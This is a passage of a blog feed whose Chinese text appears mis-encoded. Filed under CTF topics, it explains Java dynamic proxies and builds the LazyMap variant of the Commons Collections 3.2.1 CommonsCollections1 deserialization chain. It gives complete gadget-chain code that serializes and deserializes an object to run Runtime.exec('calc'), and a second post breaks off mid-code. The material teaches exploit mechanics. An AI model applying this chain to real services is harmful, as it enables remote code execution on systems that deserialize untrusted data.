class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>main()</code>ä¸­ï¼Œæˆ‘ä»¬çœ‹ä¼¼å¯¹<code>proxy</code>è°ƒç”¨äº†<code>add()</code>æ–¹æ³•ï¼Œä½†å®é™…ä¸Š<code>proxy</code>å¹¶ä¸æ˜¯å®é™…æ‰§è¡Œè€…ï¼Œè€Œæ˜¯è½¬æ‰‹è°ƒç”¨äº†ç›®æ ‡å¯¹è±¡<code>clac</code>å»æ‰§è¡Œã€‚æ­¤å¤–ä¸éš¾å‘ç°ï¼Œå¦‚æœ<code>Calculator</code>æ¥å£å¤šäº†ä¸€ä¸ª<code>divide()</code>æ–¹æ³•ï¼Œé‚£ä¹ˆå°±éœ€è¦åŒæ—¶å¯¹<code>RealCalculator</code>å’Œ<code>CalculatorProxy</code>è¿›è¡Œé‡å†™ï¼Œè¿™æ˜¯éå¸¸éº»çƒ¦çš„ï¼Œè€ŒåŠ¨æ€ä»£ç†åˆ™å¾ˆå¥½åœ°è§£å†³äº†è¿™ä¸ªé—®é¢˜</p><h3 id="åŠ¨æ€ä»£ç†"><a href="#åŠ¨æ€ä»£ç†" class="headerlink" title="åŠ¨æ€ä»£ç†"></a>åŠ¨æ€ä»£ç†</h3><p>åŠ¨æ€ä»£ç†åˆå¯åˆ†ä¸ºJavaå†…ç½®çš„JDKåŠ¨æ€ä»£ç†å’Œç¬¬ä¸‰æ–¹çš„CGLIBåŠ¨æ€ä»£ç†ï¼Œä»¥ç†è§£CC1é“¾çš„<code>LazyMap</code>çº¿è·¯ä¸ºç›®çš„åªéœ€è¦äº†è§£JDKåŠ¨æ€ä»£ç†å³å¯</p><p>åœ¨åŠ¨æ€ä»£ç†ä¸­ï¼Œé€šè¿‡ <code>Proxy.newProxyInstance()</code> æ–¹æ³•åˆ›å»ºä»£ç†å¯¹è±¡</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h)</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ<code>loader</code>ä½œä¸ºç±»åŠ è½½å™¨ï¼Œç”¨äºåŠ è½½ä»£ç†å¯¹è±¡ï¼Œ<code>interfaces</code>æŒ‡è¢«ä»£ç†ç±»å®ç°çš„æ¥å£ï¼Œ<code>h</code>éœ€è¦ä¼ å…¥ä¸€ä¸ª<code>InvocationHandle</code>çš„å®ç°ç±»ä½œä¸ºå¤„ç†å™¨ç±»ï¼Œå¯ä»¥é€šè¿‡é‡å†™<code>invoke</code>æ–¹æ³•å»è§„å®šä»£ç†å¯¹è±¡çš„å¤„ç†é€»è¾‘ã€‚åŒæ ·æ˜¯è®¡ç®—å™¨çš„ä¾‹å­ï¼Œçœ‹çœ‹åŠ¨æ€ä»£ç†æ˜¯å¦‚ä½•å®ç°çš„</p><p>å®šä¹‰å¤„ç†å™¨ç±»ï¼Œé‡å†™<code>invoke()</code>æ–¹æ³•ï¼Œ<code>proxy</code>æ˜¯ä»£ç†å¯¹è±¡æœ¬èº«ï¼Œ<code>method</code>ä¸ºè¢«è°ƒç”¨çš„æ–¹æ³•ï¼Œ<code>args</code>ä¸ºæ–¹æ³•çš„å‚æ•°æ•°ç»„</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CalcInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Object target;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CalcInvocationHandler</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">return</span> method.invoke(target, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åº”ç”¨åŠ¨æ€ä»£ç†æ¨¡å¼</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Calculator</span> <span class="variable">Calc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RealCalculator</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="type">Calculator</span> <span class="variable">proxy</span> <span class="operator">=</span> (Calculator) Proxy.newProxyInstance(</span><br><span class="line">            Calculator.class.getClassLoader(),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Calculator.class&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">CalcInvocationHandler</span>(Calc));</span><br><span class="line">        </span><br><span class="line">        System.out.println(proxy.add(<span class="number">10</span>, <span class="number">20</span>));</span><br><span class="line">        System.out.println(proxy.divide(<span class="number">20</span>, <span class="number">4</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œå¯¹<code>proxy</code>è°ƒç”¨<code>add()</code>æ–¹æ³•ï¼Œä¼šè§¦å‘<code>CalcInvocationHandler</code>å®ä¾‹çš„<code>invoke()</code>æ–¹æ³•ï¼Œè°ƒç”¨ç›®æ ‡å¯¹è±¡çš„<code>add()</code>æ–¹æ³•</p><blockquote><p>åŠ¨æ€ä»£ç†é€šè¿‡è¿è¡Œæ—¶ç”Ÿæˆå®ç°æŒ‡å®šæ¥å£çš„ä»£ç†ç±»ï¼Œå¹¶ç¼“å­˜è¿™äº›ä»£ç†ç±»ä»¥é¿å…é‡å¤ç”Ÿæˆï¼Œå°†æ‰€æœ‰æ–¹æ³•è°ƒç”¨è½¬å‘ç»™<code>InvocationHandler</code>å¤„ç†</p></blockquote><br/><h2 id="å®ç°CommonsCollections1ååºåˆ—åŒ–é“¾çš„LazyMapè·¯çº¿"><a href="#å®ç°CommonsCollections1ååºåˆ—åŒ–é“¾çš„LazyMapè·¯çº¿" class="headerlink" title="å®ç°CommonsCollections1ååºåˆ—åŒ–é“¾çš„LazyMapè·¯çº¿"></a>å®ç°CommonsCollections1ååºåˆ—åŒ–é“¾çš„LazyMapè·¯çº¿</h2><p>å›åˆ°é“¾ä¸­ï¼Œå½“å°è¯•å»å¯»æ‰¾è°ƒç”¨<code>transform()</code>æ–¹æ³•çš„ä¸Šå±‚æ–¹æ³•æ—¶ï¼Œå½“æ—¶é€‰æ‹©äº†<code>TransformedMap</code>çš„<code>checkSetValue()</code>æ–¹æ³•ã€‚é™¤æ­¤ä»¥å¤–ï¼Œ<code>LazyMap</code>çš„<code>get()</code>æ–¹æ³•ä¼¼ä¹ä¹Ÿèƒ½æ»¡è¶³è¿™ä¸€æ¡ä»¶</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.map.containsKey(key)) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">            <span class="built_in">this</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.map.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ifè¯­å¥çš„ç»•è¿‡åªè¦mapä¸­ä¸å­˜åœ¨ä¼ å…¥çš„<code>key</code>å°±è¡Œ</p><p>è¯¥ç±»çš„æ„é€ å™¨æ˜¯<code>protected</code>ä¿®é¥°çš„æ–¹æ³•ï¼Œä½†æ˜¯å…¶é™æ€çš„<code>decorate()</code>æ–¹æ³•èƒ½å¤Ÿè·å¾—ä¸€ä¸ª<code>LazyMap</code>å®ä¾‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œæˆ‘ä»¬çš„é“¾å¯ä»¥è¢«æ”¹å†™ä¸ºä»¥ä¸‹å½¢å¼</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        Map&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,invokerTransformer);</span><br><span class="line">        lazyMap.get(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ï¼Œå¯»æ‰¾è°ƒç”¨äº†<code>get()</code>çš„ä¸Šå±‚ï¼Œåœ¨<code>AnnotationInvocationHandler</code>çš„<code>invoke()</code>æ–¹æ³•ä¸­å°±å¯ä»¥å‘ç°</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">var4</span> <span class="operator">=</span> var2.getName();</span><br><span class="line">        Class[] var5 = var2.getParameterTypes();</span><br><span class="line">        <span class="keyword">if</span> (var4.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; var5.length == <span class="number">1</span> &amp;&amp; var5[<span class="number">0</span>] == Object.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.equalsImpl(var3[<span class="number">0</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var5.length != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">switch</span> (var4) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;toString&quot;</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">this</span>.toStringImpl();</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;hashCode&quot;</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">this</span>.hashCodeImpl();</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;annotationType&quot;</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">this</span>.type;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.get(var4);</span><br><span class="line">                    <span class="keyword">if</span> (var6 == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(<span class="built_in">this</span>.type, var4);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var6 <span class="keyword">instanceof</span> ExceptionProxy) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> ((ExceptionProxy)var6).generateException();</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != <span class="number">0</span>) &#123;</span><br><span class="line">                            var6 = <span class="built_in">this</span>.cloneArray(var6);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">return</span> var6;</span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¦æ‰§è¡Œåˆ°<code>Object var6 = this.memberValues.get(var4)</code>è¿˜æœ‰ä¸¤å±‚åˆ¤æ–­è¯­å¥éœ€è¦ç»•è¿‡ï¼Œé¦–å…ˆæ˜¯<code>var4</code>ä¸ç­‰äº<code>&quot;equals&quot;</code>ï¼Œç”±å‰é¢å¯¹<code>invoke()</code>æ–¹æ³•çš„åˆ†æå¯ä»¥å¾—çŸ¥ï¼Œ<code>var4</code>æ­¤å¤„æŒ‡é€šè¿‡ä»£ç†è°ƒç”¨çš„æ–¹æ³•ä¸ä¸º<code>equals()</code>ï¼Œè€Œæˆ‘ä»¬éœ€è¦è°ƒç”¨çš„æ˜¯<code>entrySet()</code>ã€‚ç„¶åæ˜¯<code>var5</code>çš„é•¿åº¦ä¸º0ï¼Œ<code>var5</code>æŒ‡ä¼ å…¥çš„å‚æ•°æ•°ç»„çš„å…ƒç´ ä¸ªæ•°ï¼Œ<code>entrySet()</code>çš„å‚æ•°ä¸ªæ•°æ˜¯0ï¼Œæ‰€ä»¥ä¸ç”¨åšåˆ»æ„ç»•è¿‡<del>ï¼ˆæ€ä¹ˆæ„Ÿè§‰è¯´äº†ç­‰äºæ²¡è¯´</del></p><p>æ¥ä¸‹æ¥å°±æ˜¯å®ä¾‹åŒ–ç¬¬ä¸€ä¸ª<code>AnnotationInvocationHandler</code>ï¼Œå¹¶å°†å…¶ä½œä¸ºä»£ç†å¤„ç†å™¨åµŒå…¥ä»£ç†ä¸­ï¼Œå®ä¾‹åŒ–è¿‡ç¨‹ç”¨åˆ°åå°„è¿™åœ¨ä¸Šä¸€ç¯‡å·²ç»æœ‰è¯´æ˜</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">annotationInvocationHandler1</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,lazyMap);</span><br><span class="line">Map&lt;Object,Object&gt; proxyMap = (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, annotationInvocationHandler1);</span><br></pre></td></tr></table></figure><p>ç„¶åå†æ¬¡å®ä¾‹åŒ–<code>AnnotationInvocationHandler</code>ä½œä¸ºå¯åŠ¨ç±»ï¼Œè¿™ä¸€æ¬¡ä¼ å…¥çš„<code>memberValues</code>åˆ™æ˜¯<code>proxyMap</code>ä»¥ç”¨æ¥è§¦å‘<code>invoke()</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InvocationHandler</span> <span class="variable">annotationInvocationHandler2</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,proxyMap);</span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œ<code>LazyMap</code>ç‰ˆæœ¬çš„CommonsCollections1ååºåˆ—åŒ–é“¾ä¹Ÿæ„é€ å®Œæ¯•äº†ï¼Œå…¨é“¾å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        Map&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">annotationInvocationHandler1</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,lazyMap);</span><br><span class="line">        Map&lt;Object,Object&gt; proxyMap = (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, annotationInvocationHandler1);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">annotationInvocationHandler2</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,proxyMap);</span><br><span class="line">        serialize(annotationInvocationHandler2);</span><br><span class="line">        unserialize(<span class="string">&quot;ser2.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;ser2.bin&quot;</span>)));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(filename)));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœç›´æ¥è¿è¡Œå¯èƒ½ä¼šæŠ¥é”™ï¼Œå› ä¸º<code>entrySet()</code>æ–¹æ³•æœŸæœ›è¿”å›ä¸€ä¸ªSetå¯¹è±¡ï¼Œè€Œæˆ‘ä»¬è¿™ä¸ªé“¾åœ¨éå†çš„æ—¶å€™ç›´æ¥å»æ‰§è¡Œå±é™©æ–¹æ³•äº†ï¼Œè¿”å›çš„æ˜¯ä¸€ä¸ªProcessï¼Œå¦‚æœæƒ³è§£å†³å¯ä»¥åœ¨transformeræ•°ç»„å¤šæ”¾ä¸€ä¸ª<code>ConstantTransformer</code>è®©å…¶è¿”å›ä¸€ä¸ªSetå°±è¡Œ</p></blockquote><p>æ€»ç»“ä¸€ä¸‹ï¼Œåœ¨é“¾ä¸­ï¼Œä¸€ä¸ª<code>AnnotationInvocationHandler</code>å¯¹è±¡è¢«ååºåˆ—åŒ–ï¼Œè¿™ä¼šè§¦å‘å…¶<code>readObject()</code>æ–¹æ³•ï¼Œ<code>readObject()</code>åœ¨è°ƒç”¨<code>entrySet()</code>éå†ä¼ å…¥çš„ä»£ç†å¯¹è±¡æ—¶ï¼Œè°ƒç”¨æˆ‘ä»¬è®¾ç½®çš„å¤„ç†å™¨å¯¹è±¡<code>annotationInvocationHandler2</code>çš„<code>invoke()</code>ï¼Œè¯¥æ–¹æ³•å¯¹ç›®æ ‡å¯¹è±¡<code>lazymap</code>è°ƒç”¨äº†<code>get()</code>æ–¹æ³•ï¼Œä¹‹åçš„è¿‡ç¨‹åˆ™ä¸å…ˆå‰çš„é“¾ä¸€è‡´</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">ois.readObject()</span><br><span class="line">â””â”€â”€ AnnotationInvocationHandler.readObject()</span><br><span class="line">    â”œâ”€â”€ this.memberValues.entrySet()</span><br><span class="line">    â”‚   â””â”€â”€ (Proxy Map).entrySet()  // åŠ¨æ€ä»£ç†å¯¹è±¡</span><br><span class="line">    â”‚       â””â”€â”€ AnnotationInvocationHandler.invoke()</span><br><span class="line">    â”‚           â”œâ”€â”€ æ–¹æ³•åæ£€æŸ¥ (member.equals(&quot;equals&quot;)...)</span><br><span class="line">    â”‚           â”œâ”€â”€ å‚æ•°æ£€æŸ¥ (paramTypes.length != 0)</span><br><span class="line">    â”‚           â””â”€â”€ this.memberValues.get(member)  // member = &quot;entrySet&quot;</span><br><span class="line">    â”‚               â””â”€â”€ (LazyMap).get(&quot;entrySet&quot;)</span><br><span class="line">    â”‚                   â”œâ”€â”€ map.containsKey(&quot;entrySet&quot;)? // ä¸å­˜åœ¨ï¼Œæ‰§è¡Œtransform</span><br><span class="line">    â”‚                   â””â”€â”€ this.factory.transform(&quot;entrySet&quot;)  // å…³é”®è§¦å‘ç‚¹</span><br><span class="line">    â”‚                       â””â”€â”€ ChainedTransformer.transform()</span><br><span class="line">    â”‚                           â”œâ”€â”€ ConstantTransformer.transform() â†’ Runtime.class</span><br><span class="line">    â”‚                           â”œâ”€â”€ InvokerTransformer.transform()  // getMethod(&quot;getRuntime&quot;)</span><br><span class="line">    â”‚                           â”‚   â””â”€â”€ Runtime.class.getMethod(&quot;getRuntime&quot;)</span><br><span class="line">    â”‚                           â”œâ”€â”€ InvokerTransformer.transform()  // invoke(null)</span><br><span class="line">    â”‚                           â”‚   â””â”€â”€ method.invoke(null, new Object[0]) â†’ Runtimeå®ä¾‹</span><br><span class="line">    â”‚                           â””â”€â”€ InvokerTransformer.transform()  // exec(&quot;calc&quot;)</span><br><span class="line">    â”‚                               â””â”€â”€ Runtime.getRuntime().exec(&quot;calc&quot;)</span><br><span class="line">    â”‚                                   â”œâ”€â”€ Processå¯¹è±¡è¿”å›</span><br><span class="line">    â”‚                                   â””â”€â”€ ç±»å‹è½¬æ¢å¼‚å¸¸ (Process â†’ Set)</span><br><span class="line">    â”‚</span><br><span class="line">    â”œâ”€â”€ for (Map.Entry&lt;String, Object&gt; var5 : this.memberValues.entrySet())</span><br><span class="line">    â”‚   â””â”€â”€ // æ­¤å¤„æœ¬åº”éå†ï¼Œä½†å› ç±»å‹å¼‚å¸¸ä¸­æ–­</span><br><span class="line">    â”‚</span><br><span class="line">    â””â”€â”€ å…¶ä»–readObjecté€»è¾‘...</span><br></pre></td></tr></table></figure><br/>]]></content>
      
      
      <categories>
          
          <category> CTFç›¸å…³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> æ‹¾é—è¡¥é˜™ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections1ååºåˆ—åŒ–é“¾ç®€æ</title>
      <link href="/2025/12/15/CommonsCollections1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E7%AE%80%E6%9E%90/"/>
      <url>/2025/12/15/CommonsCollections1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E7%AE%80%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections1ååºåˆ—åŒ–é“¾ç®€æ"><a href="#CommonsCollections1ååºåˆ—åŒ–é“¾ç®€æ" class="headerlink" title="CommonsCollections1ååºåˆ—åŒ–é“¾ç®€æ"></a>CommonsCollections1ååºåˆ—åŒ–é“¾ç®€æ</h1><p>å¦‚æœJavaé¡¹ç›®å…·æœ‰<code>Commons Collections3.2.1</code>ä¾èµ–ï¼Œåˆ™ä¼šå­˜åœ¨ååºåˆ—åŒ–åˆ©ç”¨æ¼æ´</p><p>è¯¥é“¾ä¸­ï¼Œç»ˆç‚¹æ˜¯<code>InvokerTransformer</code>ç±»ï¼Œå®ƒæ˜¯æ¥å£<code>transform</code>çš„ä¸€ä¸ªå®ç°ç±»ï¼Œå…¶é‡å†™çš„<code>transform()</code>æ–¹æ³•å¯ä»¥é€šè¿‡åå°„çš„æ–¹å¼è°ƒç”¨å±é™©æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var4) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆæ‰§è¡Œçš„å°±æ˜¯</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span 